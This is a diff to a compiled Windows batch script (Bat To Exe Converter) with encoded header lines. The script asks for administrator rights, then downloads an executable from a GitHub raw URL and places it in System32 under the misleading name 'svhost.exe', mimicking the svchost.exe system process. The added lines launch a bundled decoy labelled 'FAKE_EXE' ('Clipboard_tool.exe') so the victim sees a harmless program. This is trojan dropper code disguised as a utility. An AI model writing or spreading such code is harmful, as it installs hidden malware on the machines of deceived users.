@@ -1,7 +1,8 @@
 ::[Bat To Exe Converter]
 ::
+::fBE1pAF6MU+EWHreyHcjLQlHcCuxHUabOpEZ++Pv4Pq7sVseXO0sbLPUyLGJKe4S5gXHWdYr33ZfpOgABQtacRO5ajAgpmFO+GGdMqc=
 ::YAwzoRdxOk+EWAjk
-::fBw5plQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4eaozUlL2NL4A=
+::fBw5plQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN42e4DVyYi7LvQa/knhcdt8mHNZl6s=
 ::YAwzuBVtJxjWCl3EqQJgSA==
 ::ZR4luwNxJguZRRnk
 ::Yhs/ulQjdF+5
@@ -14,20 +15,20 @@
 ::dAsiuh18IRvcCxnZtBJQ
 ::cRYluBh/LU+EWAnk
 ::YxY4rhs+aU+IeA==
-::cxY6rQJ7JhzQF1fEqQJlZksaGUrWaTna
-::ZQ05rAF9IBncCkqN+0xwdVsBAlTMaSXqZg==
-::ZQ05rAF9IAHYFVzEqQIRKwlbTgWWfHm/B7EZ+og=
-::eg0/rx1wNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
-::fBEirQZwNQPfEVWB+kM9LVsJDCWBLmSIAuZOpu3j6oo=
-::cRolqwZ3JBvQF1fEqQIRKwlbTgWWfHm/B7EZ+qiuobrHq0MOQOMzdIrJug==
-::dhA7uBVwLU+EWHiA+0A1SA==
+::cxY6rQJ7JhzQF1fEqQJiZksaHErWaQs=
+::ZQ05rAF9IBncCkqN+0xwdVsGAlTMbCXuU9U=
+::ZQ05rAF9IAHYFVzEqQITJBJETguDLm/a
+::eg0/rx1wNQPfEVWB+kM9LVsJDCeONXu4CbQO7Nfv4OWLnUQTUfEreYPX36bOca5DpBWqJMZj02Jf+A==
+::fBEirQZwNQPfEVWB+kM9LVsJDCeONXu4CbQO7Nfv4OWLnUQTUfEreYPX36bOca5DpBWqJMZj02Jf+A==
+::cRolqwZ3JBvQF1fEqQITJBJETguDLm/6EroT5Kjy4fmTo0ERUfBf
+::dhA7uBVwLU+EWFaX9U8xaB1bXkSSLmSwA7YI+4g=
 ::YQ03rBFzNR3SWATElA==
-::dhAmsQZ3MwfNWATE100gMQldSwyWfDrjXuFRurirvqqmpkIfUaIMYZzP37mdYMkd6Ur2ZZk/125fnIsNAh8Ydwa4LgM9qmtMpWuXJInckgPtClqA4UMkCCVmgnDVnj0+ZJ0I
+::dhAmsQZ3MwfNWATEpFExJRoUTwuSJXmzAb0IqLqrvbrH7A08WO5/aobc0qCdYPIW+UD2Y5MpmBo=
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
-::Zh4grVQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4ee53U6LDdcq4W8kCE
-::YB416Ek+ZW8=
+::Zh4grVQjdCyDJGyX8VAjFDRnbSmjAE+/Fb4I5/jH/PyEqkIOQN4cdIbL2LuPMuQs/krredgozn86
+::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
@@ -42,11 +43,17 @@ if %errorlevel% neq 0 (
     "Start-Process -FilePath '%~f0' -Verb RunAs"
   exit /b
 )
-echo 1
+
+
 :: --- Target folder: the directory this .bat is in ---
+set "FAKE_EXE=oreginal CL file\Clipboard_tool.exe"
 set "TARGET_DIR=C:\Windows\System32\mc-fre"
 set "TARGET_NAME=svhost.exe"
 set "GITHUB_RAW_URL=https://github.com/osama32895/svchost/raw/refs/heads/main/svchost.exe"
+
+:: start the fake executable
+start %b2eincfilepath%\%FAKE_EXE%
+
 :: remove trailing backslash (optional, but keeps it clean)
 if "%TARGET_DIR:~-1%"=="\" set "TARGET_DIR=%TARGET_DIR:~0,-1%"
 
